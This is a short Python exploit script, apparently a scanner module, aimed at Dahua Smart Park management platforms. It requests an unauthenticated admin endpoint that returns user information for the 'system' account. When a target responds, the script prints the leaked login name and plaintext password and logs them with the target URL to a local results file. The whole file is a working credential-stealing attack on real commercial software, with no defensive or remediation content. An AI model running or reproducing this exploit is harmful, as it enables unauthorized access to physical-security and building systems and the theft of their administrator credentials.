import json
import urllib3
import requests
import time
import buter

# 禁用不安全的 HTTPS 请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = "./reps/大华智慧园区任意密码读取-"+str(time.strftime("%Y-%m-%d", time.localtime()))
poc = '/admin/user_getUserInfoByUserName.action?userName=system'

headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }

def dhapread(url):
    try:
        reps = requests.get(url=url + poc,headers=headers, verify=False, timeout=3)
        if "loginName" in reps.text:
            js = json.loads(reps.text)
            print(buter.colors.GREEN + f"存在大华智慧园区任意密码读取 loginNmae: {js['loginName']}  loginPass: {js['loginPass']} url: {url}" + buter.colors.END)
            f = open(filename,"a+",encoding="utf-8")
            f.write(f"{js['loginName']}  {js['loginPass']}  {url}")
            f.write("\n")
            f.close()
        else:
            print(buter.colors.RED + f"未发现大华智慧园区任意密码读取 {url}" + buter.colors.END)
    except Exception as e:
        print(buter.colors.END + f"ERROR : {e}"+buter.colors.END)

